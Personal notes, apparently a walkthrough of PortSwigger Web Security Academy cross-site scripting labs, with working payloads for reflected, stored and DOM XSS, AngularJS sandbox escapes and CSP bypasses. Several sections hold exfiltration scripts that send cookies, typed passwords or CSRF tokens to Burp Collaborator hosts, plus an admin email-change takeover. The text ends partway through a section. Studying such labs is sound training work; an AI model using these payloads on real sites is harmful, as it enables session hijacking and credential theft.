- [What is XSS?](#what-is-xss)
- [Reflected XSS into HTML context with nothing encoded](#reflected-xss-into-html-context-with-nothing-encoded)
- [Stored XSS into HTML context with nothing encoded](#stored-xss-into-html-context-with-nothing-encoded)
- [DOM XSS in `document.write` sink using source `location.search`](#dom-xss-in-documentwrite-sink-using-source-locationsearch)
- [DOM XSS in `innerHTML` sink using source `location.search`](#dom-xss-in-innerhtml-sink-using-source-locationsearch)
- [DOM XSS in jQuery anchor `href` attribute sink using `location.search` source](#dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source)
- [DOM XSS in jQuery selector sink using a hashchange event](#dom-xss-in-jquery-selector-sink-using-a-hashchange-event)
- [Reflected XSS into attribute with angle brackets HTML-encoded](#reflected-xss-into-attribute-with-angle-brackets-html-encoded)
- [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](#stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded)
- [Reflected XSS into a JavaScript string with angle brackets HTML encoded](#reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
- [Reflected XSS into a JavaScript string with angle brackets HTML encoded](#reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
- [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](#dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded)
- [Reflected DOM XSS](#reflected-dom-xss)
- [Stored DOM XSS](#stored-dom-xss)
- [Reflected XSS into HTML context with most tags and attributes blocked](#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
- [Reflected XSS into HTML context with all tags blocked except custom ones](#reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
- [Reflected XSS with some SVG markup allowed](#reflected-xss-with-some-svg-markup-allowed)
- [Reflected XSS in canonical link tag](#reflected-xss-in-canonical-link-tag)
- [Reflected XSS into a JavaScript string with single quote and backslash escaped](#reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped)
- [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
- [Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
- [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)
- [Exploiting cross-site scripting to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
- [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
- [Exploiting XSS to bypass CSRF defenses](#exploiting-xss-to-bypass-csrf-defenses)
- [Reflected XSS with AngularJS sandbox escape without strings](#reflected-xss-with-angularjs-sandbox-escape-without-strings)
- [Reflected XSS with AngularJS sandbox escape and CSP](#reflected-xss-with-angularjs-sandbox-escape-and-csp)
- [Reflected XSS with event handlers and `href` attributes blocked](#reflected-xss-with-event-handlers-and-href-attributes-blocked)
- [Reflected XSS in a JavaScript URL with some characters blocked](#reflected-xss-in-a-javascript-url-with-some-characters-blocked)
- [Reflected XSS protected by very strict CSP, with dangling markup attack](#reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack)
- [Reflected XSS protected by CSP, with CSP bypass](#reflected-xss-protected-by-csp-with-csp-bypass)
- [Cheatsheets](#cheatsheets)



---

# What is XSS?

Cross-site scripting (also known as XSS) is a web security vulnerability that **allows an attacker to compromise the interactions that users have with a vulnerable application**. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user **is able to perform, and to access any of the user's data**. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

---

# Reflected XSS into HTML context with nothing encoded

In this lab you can see that the word that you search in the box is reflectead, we can check if this field is well sanitized or we can try to inject some html and then javascript.

```html
<marquee>Testing</marquee>
```

```html
<script>alert(0)</script>
```

But what is the risk of the user?
You can share the url to other user and when the user open the link appear an alert with his cookie. Imagine, we can send the cookie to one of our servers and log in to your account, this technique is know as "**cookie hijacking**".

```html
<script>alert(document.cookie)</script>
```

In this lab you don't see the cookie because if you go to dev tools > cookies, you see that HttpOnly is in **true**, this means, that javascript can't access to this cookie, but you have other things, for example, you can do a **Keylogger** with javascript.

# Stored XSS into HTML context with nothing encoded

In this case we write a new comment with script tags. If we enter to the same post, we see that the XSS appear. This is the stored concept, all the people that enter to that post will pop up the alert.

```html
<script>alert('Comment')</script>
```

```html
<script>alert('Name')</script>
```

# DOM XSS in `document.write` sink using source `location.search`

DOM = Document Object Model
Is the structure of a website. A website consists of multiple HTML tags, one inside other creating a tree of tags, this is the DOM tree or DOM.

The function document.write write content with javascript in the web.
The function location.search treturns the query string portion of a URL, everything after the question mark '?'(including the cuestion mark)

If you open the source code you will see that the content that you're writting is added in the src attribute.

```html
"><h1>Testing</h1>
```

```html
"><script>alert(0)</script>
```

# DOM XSS in `innerHTML` sink using source `location.search`

In this case innerHTML() is very simmilar with document.write but there have some differents:
- document.write() write only when the page is loadding
- innerHTML only affect to the specific element in the DOM.

```html
<img src="0" onerror="alert(0)"></img>
```

# DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

If we go to submit feedback we see that in the url have a parameter called returnPath=/, this work when click on Back link. This is an anchor tag and we canmodify the href attribute using this code:

```html
javascript:alert(document.cookie)
```

# DOM XSS in jQuery selector sink using a hashchange event

In this case, if we indicate the fragment or hashtag in the url the page go to the header of the post.

If we locate the javascript code that do that, we see that have a function called **hashchange**. This function do the following:
Use `window.location.hash.slice(1)`, this obtain the content of the fragment without the hashtag and url encoded but in the script use decodeURIComponent() function.

The script search for section tag with class blog'-list' and for `<h2>` titles. For finally it takes you to the header on the page.

After view all this, we can try to inject javascript code.

```html
#<img src=0 onerror=print(0)>
```

Okey, but you think that the lab is finish?. No because if you send this link to a victim. The webpage don't do nothing because the fragment not change.

In the exploit-server section we have a malicious page.

The idea is that victim go to the page and one time inside modify the fragment to inject javascript.

For this you can use iframe, this allow you to put a webpage inside another.

```html
<iframe src="https://0a2d00ff049ea020823a2e53008800a6.web-security-academy.net/#"></iframe>
```

If you send to a victim(simulate victim) you see that load a windows with the webpage.
Now we have to send the page and modify the fragment:

```html
<iframe src="https://0a2d00ff049ea020823a2e53008800a6.web-security-academy.net/#" onload="this.src += '<img src=0 onerror=print(0)>'"></iframe>
```

onload attribute load source(that is the url) and adding the new html code.

If you want that the iframe have the full screen of the browser you can use:
```html
<iframe src="https://0a2d00ff049ea020823a2e53008800a6.web-security-academy.net/#" onload="this.src += '<img src=0 onerror=print(0)>'" style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;"></iframe>
```

Now, if you share you're malicious server with a victim can exploit sucessufuly the XSS.

# Reflected XSS into attribute with angle brackets HTML-encoded

In this case if we try to escape outside of the input function, wee that the characters "<" and ">" are html-encoded, to solve this we can add a attribute in the input tag.

```html
"onmouseover="alert(0)
```

# Stored XSS into anchor `href` attribute with double quotes HTML-encoded

In the website field you can use 

```html
javascript:alert(0)
```

# Reflected XSS into a JavaScript string with angle brackets HTML encoded

In the javascript code we see that is creating a variable, we can try to escape of this variable and write javascript code that will going to execute because is inside of the script tag.

```javascript
'; alert(0); var test='testing
```

# Reflected XSS into a JavaScript string with angle brackets HTML encoded

If we open burpsuite and reload the page, we see that is using a &storeId parameter in post.
We can add in the url(get)
Then if we inspect the font code and open the script we see the following:

Have an array of stores, obtain the storeId value of the URL and write a new select with the name storeId.

Then write an option tag with the selected value obtained from the URL.
For finish add the rest of stores except the store of the URL and add to select tag like no selected and close the select tag.

After seeing how the code work, we can use the next payload to breaks out the select element.

```html
&storeId=</option></select><script>alert(0)</script>
```

# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Angular is a javascript open source framework. When you see that in the body is using `ng-app` means that is using angular. You can try to use injections with `{{}}`, this is very useful when the angle brackets and double quotes are html-encodes.

You can see the tech and version with [Wappalyzer](https://www.wappalyzer.com/) extension.

When you don't know about something, remember, use internet, you have some pages like [PayloadAllTheThings Angular XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md) that have multiple payload.

You can use this payload obtained from PayloadAllTheThings.

```angular
{{constructor.constructor('alert(1)')()}}
```

# Reflected DOM XSS

You see an input box that can be vulnerable to XSS. The first of all is try basic html injections to see if is vulnerable:

```html
<marquee>pwned</marquee>
```

You open the inspector and see that is a text inside a `<h1>` tag, you can try to escape, but I don't think that this work because the reflected text is inside text.

```html
'</h1><h3>test</h3>
```

If we inspect a little more the source code we see two scripts tags:

```html
<script src="/resources/js/searchResults.js"></script>
<script>search('search-results')</script>
```

We see that one script is searching 'search-results'

If you want to analyse with colors you can use this line:

```bash
curl -s -X GET https://0af900e403c834e081be5c4b00070016.web-security-academy.net/resources/js/searchResults.js | cat -l javascript
```

The search function that we saw before do a XMLHttpRequest() and the most important, we see an **eval function**, eval function evaluates JavaScript code represented as a string and return its value. If this is not well sanitized we can try to inject some javascript code to obtain a XSS.

We see that the parameter use in search(path) is search-results. We can open burpsuite and see how it works.

If we search something and open HTTP history we see the request that use XMLHttpRequest to `/search-results?search=testing` path and obtain a json response where we inject the text `"searchTerm":"testing"`.

The next step is trying to **escape from json response** because if we inspect again what the eval functions we see that create a new variable with the json text:

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

If you try 2+2 with eval, eval(2+2) it return 4.
When you add a double quote to the search parameter you see that in the response it escape with a backslash `\`  but if you add a backslash what happends?

You see that escape the backslash automatically added, I recommend you to try this with intruder in Burpsuite. To use eval remember

```javascript
test\"}*document.write('sergiky')//
```

If you finally comment the rest you can execute javascript code and use alert() function to resolve the lab:

```javascript
test\"};alert('sergiky')//
```

Works almost with `+-*/` operators
```javascript
test\"}+alert('sergiky')//
```

This is possible because javascript engine see something like this:

```javascript
var obj = {"data": "test"} + alert("sergiky");
```

# Stored DOM XSS

The same thing, try to inject some js in comment section, inspect source code and analyse the javascript code.

The vulnerability in this code is the replace tag. When you use **replace()** only change the first match, but not all the matches found in the string(this work with **replaceAll()** function), you can take advantage of this to inject js code:

```javascript
<><script>alert(0)</script>
```

Ou! but doesn't work, why? If it is being interpreted in the source code. Don't worry sometimes you have to try different payloads.

```html
<><img src=x onerror=alert(0)>
```

# Reflected XSS into HTML context with most tags and attributes blocked

In this case when we try to use some tag like script we obtain a JSON response: 'Tag is not allowed', we can do bruteforce with the tags of XSS cheatsheet of portswigger.

We can intercept the request and send to the intruder and check if can discover tags allowed with this format(we check that you can use only one tag to check if is valid or not).

```
/?search=<$replace$>
```

In this case the tag **body** have a 200 status code. This means that the website interpretate this tag correctly. The next step is to **discover the valid attributes** by doing the same.

```
/?search=<body $replace$>
```

We found a lot of attributes but we have to use one that is useful, for example, `onresize`.

```html
<body onresize=print()>
```

You can resize with `ctrl + scroll wheel`, but the lab is not finished, we need that the user not required any user interaction.

To do this, we can use the exploit server and use the `<iframe>` tag and resize the iframe, you can only resize something like width or you can resize all to have a full screen iframe.

```html
<iframe src="https://0a4200fe0367bb7380a0c60b000400c7.web-security-academy.net/?search=<body onresize=print()>" onload=this.style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;"></iframe>
```

# Reflected XSS into HTML context with all tags blocked except custom ones

In this case the body tag is not available, we can try to add a custom tag and add an event like onfocus:

```html
<tag onfocus=alert(0)>test</tag>
```

But you see that this doesn't work, sometimes you have to indicate that a tag can be focusable, for this have the attribute **tabindex**.

You can select the "tag" or using tha tab key to trigger the alert.
```
<tag onfocus=alert(0) tabindex=1>test</tag>
```

In exploit server we can redirect the user to the victim page and with the id attrbute and the fragment we can focus automatically in the new custom tag.

```html
 <script>
location = 'https://0ae50005038a35a78060032f00230015.web-security-academy.net/?search=<tag id=tag_id onfocus=alert(document.cookie) tabindex=1>#tag_id';
</script>
```

# Reflected XSS with some SVG markup allowed

The lab and the description tell us that some svg tags and events are allowed, we have to use intruder again to bruteforce with the [cheatsheet of PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) like [[❌ XSS#Reflected XSS into HTML context with most tags and attributes blocked]].

We finally found this combination of tags and attribute to trigger the alert.
```html
<svg><animateTransform onbegin=alert(0)>
```

# Reflected XSS in canonical link tag

This is a SEO(Search Engine Optimization) tag, normally ubicated inside the head tag.

This tell to the engine searchs that the web can be accessible by differents url, the main url is this:

```html
<link rel="canonical" href='https://0a0d00c303f4a09d80ea5446003800d5.web-security-academy.net/'/>
```

We can try to modify this href, how?
If you try to access to another path you see a 404 error, but if you add a paramenter `?` you see that is reflected in the href:

```html

https://0a0d00c303f4a09d80ea5446003800d5.web-security-academy.net/?testing

<link rel="canonical" href='https://0a0d00c303f4a09d80ea5446003800d5.web-security-academy.net/?testing'/>
```

You can try to escape with a single quote `'` and add the necesaries attributes to pass the lab:

```html
https://0a0d00c303f4a09d80ea5446003800d5.web-security-academy.net/?testing'accesskey='x'onclick='alert(0)

<link rel="canonical" href='https://0a0d00c303f4a09d80ea5446003800d5.web-security-academy.net/?testing'accesskey='x'onclick='alert(0)'/>
```

- `accesskey='x'`: This is the shorcut, when you use this shortcut.
- `onclick='alert(0`: The event that trigger when use the shorcut, you don't close with single quote because have a extra single quote without close.

In this case you have to remove the spaces or %20

In this case we only can execute in Chrome because the `onclick` attribute don't work automatically when use  `accesskey` attribute.

Depend of your OS you can use some of the following shortcut:
- `ALT+SHIFT+X`
- `CTRL+ALT+X`
- `Alt+X`

In linux use Alt+X

# Reflected XSS into a JavaScript string with single quote and backslash escaped

In this case,we inspect the page and we see a script tag, if we try to escape with single quotes they escaped with a backlash and if you try to put a backslash it is escaped by another backslash. And now what?, we can try to think out of the box. If we try to close the `<script>` tag even though we are inside the single quotes.

```html
</script>
```

Ouh, if we inspect now we see that the script tag is interpreted and is closed.

Next try html injection.
```html
</script><marquee>testing</marquee>
```

Execute javascript code:

```html
</script><script>alert(0)</script>
```

# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

If we inspect the code and try to break with a single quote, when inspect the code and see the script tag we note that the single quote is escaped with a backslash but if we try to escape the backslash with another backslash?

```html
test\'
```

We see that the backslash is escaped and the single quote close the content of the variable, we can try to inject javascript code:

```javascript
test\'; alert(0);//
````

```javascript
test\'+alert(0);//
````

# Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Mmmm, we can't use this characters `<>"'\` because are escaped, but we always have alternatives, in this case we can try to use **html entities** that are a pattern of characters that can represent another character in the HTML code.

- **&lt;**  -> <
- **&gt;**  -> >
-  **&#39;** or **&apos;** (more for XML) -> '
- **&quot;** -> "

```html
https://sergiky.github.io&#39;+alert`0`+&#39;
```

In other words:

```html
https://test.com + ' + alert(0) + '
```

In this case we avoid the escaped filteres with html entities(in this case for single quote), then we concadenate(with plus symbol) the alert function, the alert function is triggered because is necessary to know the value before concadenate and this use **backticks** in javascript(other way that does the same that the brackets`()`)

# Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

If we inspect the code we see that in the script when declaring the variable 'message' is using **template literal**:

```js
var message = `1 search results for test'`;document.getElementById('searchMessage').innerText = message;
```

With template literal in place to use + to concadenate variables you can use backticks and call the variable with `${variable}`, we can try to execute javascript code:

```js
${alert(0)}
```

# Exploiting cross-site scripting to steal cookies

In this case we have a store XSS and we want to obtain the cookies of the users that trigger the XSS, for this, we have to use collaborator of Burpsuite because portswigger academy only allow this by measures of security.

The idea is to execute a fetch via Get to obtain the cookie.

In the comment section we can add the following:

```html
<script>
fetch("https://e9oyrrugv9cc5vm5vtyvehy1vs1jp9dy.oastify.com/?cookie=" + document.cookie);
</script>
```

The user don't see nothing, but if you open the developers tools and go to network section you see the request via GET.

But doing by this way is possible to loose some characters, for this reason, is better to use some type of encoding like **base64** to obtain the data:

```html
<script>
fetch("https://e9oyrrugv9cc5vm5vtyvehy1vs1jp9dy.oastify.com/?cookie=" + btoa(document.cookie));
</script>
```

Burpsuite automatically decode base64, if not you can use the terminal:

```bash
echo 'c2VjcmV0PXZPNlRWNW1mNW10dUhwQ21DdlJ1OEdMMnBlT3VJMThjOyBzZXNzaW9uPTRMNFlPeDVrZnJ2T3MzdURYaDhYWDd3YkkyU25zbVZS' | base64 -d; echo
```

Now if go to development tools > Storage > Cookie and replace the session value, reload the website and you are in the session of the Administrator user.

This is possible because the **HttpOnly** flag in the cookie is **false**.

# Exploiting cross-site scripting to capture passwords

In this case we are going to capture the user and the password of the user. In this lab is automatized that a user log in.

In this case we're going to recreate a phising attack using a XSS stored. The idea is that the user introduce the username and the password in the comment section.

I doubt that this example will work in the real life, I think that will better do another alternatives like use a link with a page just like the login page.

Put this in comment section and reload the collaborator:

```html
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://5oue0tby4xal13oh3gs5qle6mxsoge43.oastify.com',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

You can use **img.src** to exfiltrate the data, this have the following advantages:

- You can avoid **CORS restrictions**.
- **You don't need to use fetch() or CSRF tokens**, is more stealthy.
- Create invisible image 1x1.

```html
<input type="text" name="username">
<input type="text" name="password" onchange=obtain_values()>

<script>
function obtain_values(){
    var username = document.getElementsByName('username')[0]?.value || '';
    var password = document.getElementsByName('password')[0]?.value || '';

    var img = new Image();
    img.src = `https://367cirtwmvsjj16flea38jw44vamydm2.oastify.com/steal?u=${encodeURIComponent(username)}&p=${encodeURIComponent(password)}`;
}
</script>
```

# Exploiting XSS to bypass CSRF defenses

Cross Site Request Foregery vulnerability exploit the trust of the server to obtain senstive data or do some malicious actions, for example:

A victim user is authenticated in a bank website and visit a malicious website that do a a request to the bank website with session cookies obtained automatically because the user is authenticate. Then the attacker can transfer money, change password, mail...

To avoid this vulnerability when you try to change the email of the user in post send two parameters, the new email and the CSRF token that is normally generated when the user log in. This is a random string that request the server protecting from this attacks.

Login with wiener:peter, then change the email and intercept with burpsuite and obtain this post:

```
email=test@test.com&csrf=sYxDTNVeIbHegX5dx5wkxzK0winKWh4F
```

If you search in the source code of the page, and filter by csrf you can found the same value in a input tag but **hidden**.

```
<input required type="hidden" name="csrf" value="sYxDTNVeIbHegX5dx5wkxzK0winKWh4F">
```

The idea is to exploit the XSS to obtain the source code of the page of the administrator to obtain his CSRF token and then use it to change his email.

```js
<script>
var req = new XMLHttpRequest();
req.open("GET", "/my-account", false);
req.send();
var response = req.responseText;
var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];

var image = new Image();
image.src = `https://w635iktpmoscju68l7aw8cwx4oafy8mx.oastify.com/?token=${btoa(csrf_token)};`
</script>
```

When some user open the page is executing the XSS, this XSS contain the following:

We are doing a request via GET syncronous to **/my-account** path and obtain the source code(req.responseText), then we are obtaining only the value of some tag that have the name "csrf". This **obtain two values**, the name and value and only the **value of the value attribute** and since we want to obtain only the value of the csrf and return an array(because found two matches), we obtain the second value with **\[1\]**. For finish, we send the CSRF token via image in base64.

One time obtained the CSRF token we can try to change the email:

```js
<script>
var req = new XMLHttpRequest();
req.open("GET", "/my-account", false);
req.send();
var response = req.responseText;
var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
var req2 = new XMLHttpRequest();
req2.open("POST", "/my-account/change-email", true);
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token);
req2.send(data);
</script>
```

Now to change the email of the administrator user, we send a request via POST to the endpoint '/my-account/change-email' asyncronous because we don't want to wait nothing. Then add the Content-Type header this is very important for the request work well and the data needed, only the new mail and the CSRF token of the administrator user.

You have to be careful because sometimes if the email exists you can't change to the same email.

With this example you see the powerfull of XSS. The user administrator only open the post and we are able to change his email.

# Reflected XSS with AngularJS sandbox escape without strings

AngularJS is a framework that doesn't have support from December, 31, 2021.

AngularJS introduce sandbox with security mechanism and isolation to limit what can do inside the expression(`{{}}`) of angular. This avoid xss, exfiltrate data from the model...

If we detect that is angular in the console of the developer tools we can use this:

```js
angular.version.full
```

If we open the [XSS Cheatsheet portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and search from `AngularJS sandbox escapes reflected` we can see that depend of the version we have differents ways to try to break the sandbox to execute code.

If we see the payload corresponding for the version of the page we see that have characters and in the title tell us that we can't use strings. If we go a little down in **DOM based AngularJS sandbox escapes** we see that have 1.4.4(without strings)

```js
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

But at the moment we are not going to use. We are going to inspect the code of the page.

The page have this script:

```js
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = 'testing';
                            $scope.value = $parse(key)($scope.query);
                        });
```

- `angular.module` -> Is like a box that contain all the tools, components, service and more necessary to build an app.
- `controller` -> A controller allow you to **control the logic of the app**, in this case is a function called 'vulnCtrl'. This function have '\$scope'(special object which acts like a bridge between the controller and view) and '\$parse'(service that interpretate AngularJS expresions, convert things like user.name to a function that evaluate this expressions) that are mandatory for it to work.
- `var key = 'search';` -> Create a variable with key string.
- `$scope.query[key] = 'testing';` -> Is like: `{ search: 'testing'}`
- `$scope.value = $parse(key)($scope.query);` -> 
	- `$parse(key)` -> Convert the 'search' string to a evaluable function. It's like say: Do that the string 'search' be code that can be executable in a object.
	- `($scope.query)` -> Execute/evaluate the function(of parse) about the object scope.query.

We execute 'key' with $parse and we can control key, this means that evaluate dynamic expressions and this is very dangerous. 

Now, we try to change search for another value, we see that this doesn't work, but if we try to another paramenter to the url and inspect the javascript code?

```
https://0ab9001f03857346808e03bb005d00f2.web-security-academy.net/?search=testing&pwned=value
```

We see that write again the key variable and a execute a new query, we can see now that **we can control the key variable**
```js
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = 'testing';
                            $scope.value = $parse(key)($scope.query);
                            var key = 'pwned';
                            $scope.query[key] = 'value';
                            $scope.value = $parse(key)($scope.query);
                        });
```

You can try to do a simple addition

```
https://0ab9001f03857346808e03bb005d00f2.web-security-academy.net/?search=testing&2%2b2=value
```

Uuuh we see that respond with a 4. Now we can try to inject the payload seen above in the XSS Cheatsheet.

You have to url encode the `=` to  `%3D`
```
https://0ab9001f03857346808e03bb005d00f2.web-security-academy.net/?search=testing&toString().constructor.prototype.charAt%3D[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=value
```

And we solve the lab, but don't worry if you don't see the alert, it's some error of the lab.


- `toString().constructor.prototype.charAt=[].join;` -> Is indicating that the function charAt(that is using for analyse the characters in the sandbox for security) **change** for `[].join`, this create and return a new string by concatenating all of the elements in the array, separated by commas or a specified separator string breaking the default way of security of the sandbox.
- `[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=value` -> Is not necessary to have two values in the array. With **orderBy**(by default order an array based in a sort criterion that is the alert) **evaluate** the following code and as since you can't use strings you can use fromCharCode(120...) this is equal to **x=alert(1)**. Why x=alert(1)?. Because alert(1) return undefined and is insecure, but if you use a variable AngularJS can work with them and it's secure.

# Reflected XSS with AngularJS sandbox escape and CSP

**Content Security Policy (CSP)** is a security function that help to avoid attacks of commands between webpages. This happens when the browser is fooled to execute malicious content from a source that appears to be reliable but is not.

You can try to inject html code and JS, html is interpreted but JS no. If you go to some request in network tool you can see this CSP configuration:

```
content-security-policy: default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'
```

- `default-src 'self'` -> Only allow to load resources from the same origin by default.
- `script-src 'self'` -> Allow to load script from the same domain. Don't allow to load inline scripts(`<script>alert(0)</script>`). Don't allow 'eval()' function. 
- `style-src 'unsafe-inline' 'self'` -> Allow inline styles from the domain.

If we look the [XSS Cheatsheet portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and search for 'AngularJS CSP bypass' we found the payloads.

```js
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
```

- `<input id=x` -> create input html tag.
- `ng-focus` -> It's like attribute onfocus in html.
- `$event.composePath()` -> It's used to force the evaulation of a instruction, return an array of all the elements of the DOM that passing the element.
- `|orderBy:` -> | is a pipe that is using to filter results.
- `'(z=alert)(1)'>` -> Is the same that z(1) -> alert(1).

We can try this payload, we see the **ng-focus**, that control what happens if get the focus. This is not a inline script, we can bypass the CSP.

But you have to automate this because require user interaction, go to exploit server and put the following in the body.

```html
<script>
location = 'https://0a1600f703a30b7580210dbf0064008f.web-security-academy.net/?search=<input%20id=x ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x';
</script>
```

I choose this payload because have the id=x attribute and we can use this to get the focus of the element using the fragment at the final. `#x`.

I recommend you to URL encode the single quotes(%27) of the payload and the spaces with(%20).

# Reflected XSS with event handlers and `href` attributes blocked

In this lab we can use `<a>` but we can use the attribute `href` and `<svg>`.

You can try to do bruteforce to discover new tags, but I don't recommend you because the lab will be very slow.

We can use a vectorial image(svg) that allows you to create links like in HTML.

```html
<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=30 y=30 >Click me!</text></a>
```

- The animate element animates others element in svg, in this case **href**.
- Change the value of the attribute to javascript:alert(0) schema that trigger a XSS.
- Then create text in the svg tag. You have to indicate coordinates to appear.

# Reflected XSS in a JavaScript URL with some characters blocked

In this case, if we go to a post and inspect the source code, if we search by "script" we found the following line:

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d3'}).finally(_ => window.location = '/')">Back to Blog</a>
```

Url decode:
```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3'}).finally(_ => window.location = '/')">BacktoBlog</a>
```

In this case when you click in `BackToBlog` link to do a post request to /analytics and sending this data: `/post?postId=3`, we can control the postId in the url.

We can try to escape to inject more js code, but if you add a single quote (') you see an error: 'Invalid blog post ID'

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3''}).finally(_ => window.location = '/')">BacktoBlog</a>
```

Mmm, if we inspect the code, we see that **fetch is receiving two parameters**, analytics and {method...}, but if we add another one? javascript has to evaluate even if it is not used. 

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3'},{x:''}).finally(_ => window.location = '/')">BacktoBlog</a>
```

In the code above, we close the object and add a new paramenter that is a new object `x:''`, we add a object because we have to close successfully the remaining part: `})`.

```js
3'},{x:''
```

You obtain the same, invalid blog post ID.

Mmm it seems to be that the backend only expects numbers, but we can see if the number is part of some string more bigger, we can try to do a little fuzz to test if some character is valid to concadenate the string.

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt 'https://0a4c003b04e383ba80740df8004d0053.web-security-academy.net/post?postId=5FUZZ%27},{x:%27'
```

And we obtain a **200** response with two characters, **&** and **#**.

If we add the hashtag and do hovering on back to blog we see that the new string doesn't appear, this is because the browser interpretate like fragment.

Now if we add the ampersand and do hovering we see that the new string appear.

We can aggregate another parameter that allow us to trigger an alert.

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3'},alert(1),{x:''}).finally(_ => window.location = '/')">BacktoBlog</a>
```

If we do hovering again we see that the parenthesis don't appear, we can try with backticks and the same.

We can try to launch an exception with **throw** and try to use an arrow function.

```html
<script>
x = () => {
	throw 2;
}
x();
</script>
```

But you can't use the parenthesis, you can do the same with this sintaxis:

```html
<script>
x = x => {
	throw 2;
}
x();
</script>
```

If you throw multiples values the result that return is the last one, but the previous ones are evaluated.

```html
<script>
x = x => {
	throw onerror=console.log,4;
}
x();
</script>
```

In this case we are overwriting what happens when occur an error in the web, in this case pass the error to console.log function.

Now when throw something, in this case a 4, the 4 passes through the console.log function.

You can try to use alert and see that is interpreted(you can open a simple python server and load this in an index.html)
```html
<script>
x = x => {
	throw onerror=alert,4;
}
x();
</script>
```

We have to remove all the parenthesis:

```html
<script>
x = x => {
	throw onerror=alert,4;
}

toString=x;
window + '';
</script>
```

window represents a windows in which the script is running. It's like the father of all.

If you try to do an addition of an object and a string, javascript need to convert window to string automatically because are different types and do **window.toString()**. In this case **window.x that throw the alert**.

```html
<script>x=x=>{throw/**/onerror=alert,4},toString=x,window + ''</script>
```


```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=3'},x=x=>{throw/**/onerror=alert,1337},toString=x,window + '',{x:''}).finally(_ => window.location = '/')">BacktoBlog</a>
```

```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window %2b% '',{x:'
```

```
https://0a96008603e684e7848681f600b200da.web-security-academy.net/post?postId=1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'
```

# Reflected XSS protected by very strict CSP, with dangling markup attack

In the input field we can't try to inject nothing because request a email format, but we can use the url and check if is injectable:

```
https://0aef00830312e3e5807f7b7b002a00ef.web-security-academy.net/my-account?email=prueba">
```

In the page we see `">` characters, we see that is reflected, let's go to try an alert:
```
https://0aef00830312e3e5807f7b7b002a00ef.web-security-academy.net/my-account?email=prueba"><script>alert(0)</script>
```

The alert wasn't triggered, when I inspect the source code that all it's ok, why doesn't work?

If we go to the console and search errors, we see this:

```
Content-Security-Policy: The page’s settings blocked an inline style (style-src-elem) from being applied because it violates the following directive: “style-src 'self'”. Consider using a hash ('sha256-GsQC5AaXpdCaKTyWbxBzn7nitfp0Otwn7I/zu0rUKOs=', requires 'unsafe-hashes' for style attributes) or a nonce.
```

